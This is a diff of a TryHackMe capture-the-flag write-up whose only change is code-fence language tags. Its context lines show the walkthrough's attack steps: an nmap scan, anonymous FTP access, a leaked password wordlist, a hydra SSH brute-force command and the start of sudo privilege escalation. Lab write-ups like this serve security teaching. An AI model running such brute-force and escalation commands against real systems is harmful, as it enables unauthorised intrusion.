@@ -8,7 +8,7 @@ tryhackme
 *here is a nmap scan of the machine*
 nmap command :- nmap -A http:// <IP_Address>
 
-```
+```bash
 Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
@@ -59,7 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 33.70 seconds
 - command :- ftp <IP_Address> 
 - when asked for user enter anonymous
 
-```
+```bash
 ftp> ls -la
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -85,7 +85,7 @@ $ cat task.txt
 ___
 locks.txt
 this look's like a wordlist so we will use it for bruteforce
-```
+```bash
 *$ cat locks.txt* 
 - rEddrAGON
 - ReDdr4g0nSynd!cat3
@@ -121,7 +121,7 @@ this look's like a wordlist so we will use it for bruteforce
 **trying to brute force ssh using hydra**
 now we have the user name and we will use the wordlist locks.txt to brute force
 command :- hydra -l lin -P locks.txt  <IP_Address> ssh
-```
+```bash
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-22 21:45:38
@@ -140,7 +140,7 @@ ___
 now we need to escalate our privilege
 we can exploit  lin's sudo privilege
 command :- sudo -l
-```
+```bash
 lin@bountyhacker:~$ sudo -l
 [sudo] password for lin: 
 Matching Defaults entries for lin on bountyhacker:
